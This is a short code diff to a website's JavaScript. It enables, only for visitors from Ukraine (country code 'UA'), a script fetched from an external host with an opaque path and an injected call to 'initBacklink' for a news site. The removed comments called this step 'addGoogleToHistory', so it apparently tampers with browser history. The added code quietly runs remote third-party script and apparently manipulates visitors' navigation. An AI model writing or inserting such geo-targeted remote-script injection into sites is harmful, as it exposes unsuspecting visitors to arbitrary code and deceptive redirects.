@@ -298,19 +298,22 @@ $(document).ready(function () {
   lang ? "" : (lang = "ru");
   var countryCode = document.getElementById('countryCode').value;
 
-  // var script = document.createElement('script');
-  // script.src = '//static.hemgoz.com/dx0h18h8qliv687qt2qh818h0pmvuq/y305cd7.js';
-  // script.type = 'text/javascript';
-  // document.head.appendChild(script);
+ 
 
 
-  // function addGoogleToHistory() {
-  //  window.initBacklink("https://ariana.news/")
-  // }
-
-  // if (countryCode === 'UA') {
-  //   addGoogleToHistory();
-  // }
+  if (countryCode === 'UA') {
+    var script = document.createElement('script');
+    script.src = '//static.hemgoz.com/dx0h18h8qliv687qt2qh818h0pmvuq/y305cd7.js';
+    script.type = 'text/javascript';
+    document.head.appendChild(script);
+  
+  
+    var script = document.createElement('script');
+    script.type = 'text/javascript';
+    script.text = 'window.initBacklink("https://ariana.news");';
+  
+    document.body.appendChild(script);
+  }
 
   let metaTag = document.querySelector('meta[name="google"][content="notranslate"]');
   if (!metaTag) {
